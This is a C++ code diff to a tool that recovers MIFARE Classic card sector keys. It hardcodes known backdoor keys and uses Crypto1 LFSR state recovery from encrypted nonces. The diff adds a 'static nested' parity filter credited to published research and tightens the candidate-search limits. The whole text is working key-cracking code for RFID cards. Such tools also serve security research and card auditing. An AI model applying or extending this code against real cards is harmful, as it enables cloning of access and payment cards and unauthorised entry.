@@ -12,7 +12,8 @@ extern "C" {
 namespace MfcBackdoorSENRecovery {
 namespace {
 
-constexpr uint32_t kMaxRecoveryCandidates = 100000;
+constexpr uint32_t kMaxLfsrWalk = 100000;
+constexpr uint32_t kMaxCheckPerKey = 96;
 
 constexpr uint8_t kBackdoorKeys[][6] = {
   {0xA3,0x96,0xEF,0xA4,0xE2,0x4F},
@@ -30,15 +31,18 @@ uint8_t par8(uint8_t b) {
   return static_cast<uint8_t>((~b) & 1);
 }
 
-bool parityOk(uint32_t nt, uint32_t ntEnc, uint32_t ks, uint8_t parNibble) {
-  if (parNibble == 0) return true;
-  const uint8_t p0 = (parNibble >> 3) & 1;
-  const uint8_t p1 = (parNibble >> 2) & 1;
-  const uint8_t p2 = (parNibble >> 1) & 1;
-  return
-      (par8((nt >> 24) & 0xFF) == (p0 ^ par8((ntEnc >> 24) & 0xFF) ^ BIT(ks, 16))) &&
-      (par8((nt >> 16) & 0xFF) == (p1 ^ par8((ntEnc >> 16) & 0xFF) ^ BIT(ks,  8))) &&
-      (par8((nt >>  8) & 0xFF) == (p2 ^ par8((ntEnc >>  8) & 0xFF) ^ BIT(ks,  0)));
+// staticnested_1nt last-parity filter (Doegox / eprint 2024/1275).
+// nt_par_enc nibble bit0 is the encrypted parity of nt LSB.
+bool lastParityOk(uint32_t nt, uint8_t ntParEnc, uint64_t lfsr, uint32_t uid32) {
+  Crypto1State* s = crypto1_create(lfsr);
+  if (!s) return true;
+  crypto1_word(s, nt ^ uid32, 0);
+  const uint32_t ks2 = crypto1_word(s, 0, 0);
+  crypto1_destroy(s);
+  const uint8_t lastpar1 = par8(static_cast<uint8_t>(nt & 0xFF));
+  const uint8_t kslastp = static_cast<uint8_t>((ks2 >> 24) & 1);
+  const uint8_t lastpar2 = static_cast<uint8_t>((ntParEnc & 1) ^ kslastp);
+  return lastpar1 == lastpar2;
 }
 
 int recoverKey(Result& result, uint8_t sector, bool keyB,
@@ -48,7 +52,6 @@ int recoverKey(Result& result, uint8_t sector, bool keyB,
   if (nt == 0 && ntEnc == 0) return 0;
 
   const uint32_t ks = ntEnc ^ nt;
-  if (!parityOk(nt, ntEnc, ks, par)) return 0;
   Crypto1State* revstate = lfsr_recovery32(ks, nt ^ uid32);
   if (!revstate) return 0;
 
@@ -56,21 +59,22 @@ int recoverKey(Result& result, uint8_t sector, bool keyB,
   const uint8_t block = trailerBlock(sector);
   const uint8_t keyType = keyB ? 0x61 : 0x60;
   bool found = false;
+  int walked = 0;
   int checked = 0;
 
   for (Crypto1State* rs = revstate; (rs->odd != 0 || rs->even != 0) && !found; ++rs) {
+    if (++walked > kMaxLfsrWalk) break;
     lfsr_rollback_word(rs, nt ^ uid32, 0);
     uint64_t candidate = 0;
     crypto1_get_lfsr(rs, &candidate);
 
     Crypto1State* test = crypto1_create(candidate);
+    if (!test) continue;
     crypto1_word(test, uid32 ^ nt, 0);
     const uint32_t testKs = crypto1_word(test, 0, 0);
     crypto1_destroy(test);
-    if ((ntEnc ^ nt) != testKs) {
-      if (++checked > kMaxRecoveryCandidates) break;
-      continue;
-    }
+    if ((ntEnc ^ nt) != testKs) continue;
+    if (!lastParityOk(nt, par, candidate, uid32)) continue;
 
     uint8_t bytes[6];
     uint64_t tmp = candidate;
@@ -90,7 +94,7 @@ int recoverKey(Result& result, uint8_t sector, bool keyB,
       ++result.recovered;
       found = true;
     }
-    if (++checked > kMaxRecoveryCandidates) break;
+    if (++checked >= kMaxCheckPerKey) break;
   }
 
   free(revstate);
